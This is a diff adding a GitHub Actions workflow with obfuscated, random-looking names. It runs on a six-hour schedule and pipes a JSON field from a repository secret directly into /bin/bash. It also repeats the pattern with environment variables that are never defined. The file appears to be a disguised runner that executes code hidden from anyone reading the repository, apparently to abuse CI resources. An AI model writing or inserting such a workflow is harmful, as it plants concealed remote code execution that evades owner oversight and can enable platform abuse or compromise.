@@ -1,0 +1,21 @@
+name: farmerrisotto
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: farmerrisotto
+        env:
+          qjhg81411: ${{ secrets.qjhg81411 }}
+        run: |
+          echo $qjhg81411 | jq -r .p47518 | /bin/bash
+          echo $ccb3 | jq -r .yhrle45855 | /bin/bash
+          echo $sjltm804 | jq -r .xovj17181 | /bin/bash
+          echo $qbywq0 | jq -r .aunj64569 | /bin/bash
+
